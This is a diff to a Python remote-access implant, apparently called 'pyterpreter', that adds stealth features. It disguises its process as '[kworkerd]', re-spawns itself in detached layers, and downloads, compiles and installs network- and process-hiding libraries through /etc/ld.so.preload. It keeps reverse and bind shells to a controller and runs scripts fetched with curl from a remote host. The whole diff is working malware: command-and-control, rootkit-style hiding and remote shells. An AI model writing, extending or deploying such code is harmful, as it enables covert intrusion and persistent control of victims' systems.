@@ -8,11 +8,17 @@ import random
 import string
 import os
 from time import sleep
-import sys
 import pty
+import tempfile
+
+
+PROCESS_NAME = '[kworkerd]'
+DEBUG = False
 
 
 class EnvKeys:
+    FILE = 'FILE'
+    LAYER = 'LAYER'
     NO_RESTART = 'NO_RESTART'
     OPEN_SHELL_CLASSIC_PORT = 'OPEN_SHELL_CLASSIC_PORT'
     OPEN_SHELL_TUNNELED_CONVERSATION_UID = 'OPEN_SHELL_TUNNEL_CONVERSATION_UID'
@@ -23,6 +29,8 @@ class EnvKeys:
 
 
 class Env:
+    file = os.environ.get(EnvKeys.FILE, __file__)
+    layer = int(os.environ.get(EnvKeys.LAYER, '0'))
     no_restart = bool(os.environ.get(EnvKeys.NO_RESTART))
     open_shell_classic_port = os.environ.get(EnvKeys.OPEN_SHELL_CLASSIC_PORT, None)
     open_shell_tunneled_conversation_uid = os.environ.get(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID, None)
@@ -34,16 +42,18 @@ class Env:
 
 class Process:
     @staticmethod
-    def get_cmd_output(cmd: str, strip_new_line=True) -> str:
+    def get_cmd_output(cmd: str, strip_new_line=False) -> [int, bytes]:
+        print(cmd)
         proc = subprocess.run(cmd, shell=True, stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
-        if strip_new_line and proc.stdout.decode()[-1] == '\n':
-            return proc.stdout.decode()[:-1]
+        if strip_new_line and len(proc.stdout) > 0 and proc.stdout[-1] == b'\n'[0]:
+            return proc.returncode, proc.stdout[:-1]
         else:
-            return proc.stdout.decode()
+            return proc.returncode, proc.stdout
 
     @staticmethod
     def spawn_self_with_env(env: dict):
-        subprocess.Popen(['python3', __file__], env={**os.environ, **env}, stdin=subprocess.DEVNULL)
+        subprocess.run(['python3', Env.file], env={**os.environ, **env}, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
 
 
 class Message:
@@ -52,6 +62,9 @@ class Message:
     RUN_SCRIPT = 'RUN_SCRIPT'
     OPEN_SHELL_TUNNELED = 'OPEN_SHELL'
     OPEN_SHELL_CLASSIC = 'OPEN_SHELL_CLASSIC'
+    LOG = 'LOG'
+    ERROR = 'ERROR'
+    STEALTH = 'STEALTH'
     conversation_uid: str
     purpose: str
     args: Tuple[str]
@@ -89,7 +102,7 @@ class Communication:
         sleep(1)
         if not Env.no_restart:
             print('Restarting')
-            os.execvp(sys.executable, [sys.executable, *sys.argv])
+            Process.spawn_self_with_env({})
         else:
             exit(1)
 
@@ -118,6 +131,49 @@ class Communication:
             Communication.messages_to_send.put(Message(Message.PONG))
 
 
+class StealthModule:
+    @staticmethod
+    def initialise():
+        has_gcc_code = Process.get_cmd_output('gcc --version')[0]
+        network_hider_filename = '/usr/local/lib/libc.so'
+        process_hider_filename = '/usr/local/lib/ld.so'
+        if not os.path.isdir(os.path.dirname(network_hider_filename)):
+            network_hider_filename = tempfile.mkstemp()[1]
+        if not os.path.isdir(os.path.dirname(process_hider_filename)):
+            process_hider_filename = tempfile.mkstemp()[1]
+
+        if has_gcc_code == 0:
+            log('Building stealth exploits from source')
+            network_hider_source_fd, network_hider_source_filename = tempfile.mkstemp(suffix='.c')
+            process_hider_source_fd, process_hider_source_filename = tempfile.mkstemp(suffix='.c')
+            network_hider_source = MessageProcessor.get_resource('stealth', 'network_hider.c')
+            process_hider_source = MessageProcessor.get_resource('stealth', 'process_hider.c')
+            os.write(network_hider_source_fd, network_hider_source)
+            os.write(process_hider_source_fd, process_hider_source)
+            os.close(network_hider_source_fd)
+            os.close(process_hider_source_fd)
+
+            assert 0 == Process.get_cmd_output(f'gcc -fPIC -shared -o {network_hider_filename} {network_hider_source_filename} -ldl')[0]
+            assert 0 == Process.get_cmd_output(f'gcc -fPIC -shared -o {process_hider_filename} {process_hider_source_filename} -ldl')[0]
+
+            os.unlink(network_hider_source_filename)
+            os.unlink(process_hider_source_filename)
+
+        else:
+            log('gcc not installed so using prebuilt libraries')
+            with open(network_hider_filename, 'wb+') as fh:
+                fh.write(MessageProcessor.get_resource('stealth', 'network_hider.so'))
+                fh.truncate()
+            with open(process_hider_filename, 'wb+') as fh:
+                fh.write(MessageProcessor.get_resource('stealth', 'process_hider.so'))
+
+        with open('/etc/ld.so.preload', 'w+') as fh:
+            fh.write(f'{network_hider_filename}\n{process_hider_filename}\n')
+            fh.truncate()
+
+        log(f'Stealth injection successful, current process PID is {os.getpid()}')
+
+
 class Core:
     @staticmethod
     def receive_line_from_sock(sock: socket.socket):
@@ -138,7 +194,7 @@ class MessageProcessor:
             print(f'Processing: {message}')
             if message.purpose == Message.RUN_SCRIPT:
                 script_name = message.args[0]
-                script_data = MessageProcessor._get_resource('scripts', script_name)
+                script_data = MessageProcessor.get_resource('scripts', script_name)
                 script = subprocess.Popen(['bash', '-s'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout, stderr = script.communicate(script_data)
                 Communication.messages_to_send.put(Message(
@@ -151,31 +207,32 @@ class MessageProcessor:
                 Process.spawn_self_with_env({EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID: message.conversation_uid})
             elif message.purpose == Message.OPEN_SHELL_CLASSIC:
                 Process.spawn_self_with_env({EnvKeys.OPEN_SHELL_CLASSIC_PORT: message.args[0]})
+            elif message.purpose == Message.STEALTH:
+                StealthModule.initialise()
             else:
-                send_error_message('process_messages_forever', f'Unknown message purpose {message.purpose}')
+                error(f'Error in: process_messages_forever: Unknown message purpose {message.purpose}')
 
     @staticmethod
-    def _get_resource(category: str, name: str) -> bytes:
+    def get_resource(category: str, name: str) -> bytes:
         print(f'{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
-        return Process.get_cmd_output(f'curl -s http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}', False).encode()
+        code, resource = Process.get_cmd_output(f'curl -s http://{Env.remote_ip}:{Env.resources_port}/{category}/{name}')
+        assert code == 0
+        return resource
 
 
 class Config:
-    username = Process.get_cmd_output('whoami')
+    username = Process.get_cmd_output('whoami', True)[1].decode()
 
 
-def main():
-    if os.environ.get(EnvKeys.PYTERPRETER) is None:
-        os.environ[EnvKeys.PYTERPRETER] = Env.pyterpreter
-        print((sys.executable, sys.argv))
-        os.execvp(sys.executable, [sys.executable, *sys.argv])
-    elif Env.open_shell_tunneled_conversation_uid is not None:
+def main_detached():
+    if Env.open_shell_tunneled_conversation_uid is not None:
         os.environ.pop(EnvKeys.OPEN_SHELL_TUNNELED_CONVERSATION_UID)
         header = b':'.join(b64encode(header_part.encode()) for header_part in ['', Message.OPEN_SHELL_TUNNELED, Env.open_shell_tunneled_conversation_uid])
         sock = socket.create_connection((Env.remote_ip, Env.remote_port))
         sock.send(header + b'\n')
         [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
         pty.spawn("/bin/bash")
+
     elif Env.open_shell_classic_port is not None:
         os.environ.pop(EnvKeys.OPEN_SHELL_CLASSIC_PORT)
         sock = socket.socket()
@@ -188,6 +245,7 @@ def main():
                 break
         [os.dup2(sock.fileno(), fd) for fd in (0, 1, 2)]
         pty.spawn("/bin/bash")
+
     else:
         try:
             sock = socket.create_connection((Env.remote_ip, Env.remote_port))
@@ -198,12 +256,54 @@ def main():
             MessageProcessor.process_messages_forever()
 
 
-def send_error_message(location: str, error: str):
-    Communication.messages_to_send.put(Message(
-        'ERROR',
-        location,
-        error
-    ))
+def main():
+    if Env.layer == 0:
+        os.environ[EnvKeys.LAYER] = '1'
+        os.environ[EnvKeys.PYTERPRETER] = Env.pyterpreter
+        os.environ[EnvKeys.FILE] = __file__
+        child = subprocess.Popen(['python3', __file__], stdout=subprocess.PIPE)
+        grandchild_pid = child.stdout.readline().decode()[:-1]
+        print(f'Pyterpreter running at {grandchild_pid}')
+        if DEBUG:
+            try:
+                while True:
+                    pass
+            except KeyboardInterrupt:
+                os.system(f'kill {grandchild_pid}')
+    elif Env.layer == 1:
+        os.environ[EnvKeys.LAYER] = '2'
+        grand_child = subprocess.Popen(
+            ['bash'],
+            stdin=subprocess.PIPE,
+            start_new_session=True
+        )
+
+        if any([Env.open_shell_classic_port, Env.open_shell_tunneled_conversation_uid]):
+            process_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
+        else:
+            process_name = PROCESS_NAME
+        grand_child.stdin.write(f'exec -a {process_name} python3\n'.encode())
+        grand_child.stdin.flush()
+        with open(__file__, 'rb') as fh:
+            grand_child.stdin.write(fh.read())
+            grand_child.stdin.write(b'\nmain()')
+        grand_child.stdin.close()
+        print(grand_child.pid, flush=True)
+        if DEBUG:
+            import time
+            time.sleep(10)
+
+    else:
+        os.environ[EnvKeys.LAYER] = '0'
+        main_detached()
+
+
+def log(message: str):
+    Communication.messages_to_send.put(Message(Message.LOG, message))
+
+
+def error(message: str):
+    Communication.messages_to_send.put(Message(Message.ERROR, message))
 
 
 if __name__ == '__main__':
